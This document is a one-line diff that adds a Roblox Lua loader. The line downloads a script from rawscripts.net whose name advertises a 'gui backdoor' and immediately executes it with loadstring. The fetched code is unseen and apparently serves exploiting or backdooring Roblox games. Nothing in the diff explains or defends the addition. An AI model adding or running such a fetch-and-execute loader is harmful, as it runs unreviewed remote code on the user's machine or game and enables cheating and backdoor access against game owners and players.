@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-k00p77-gui-backdoor-f3x-238167"))()
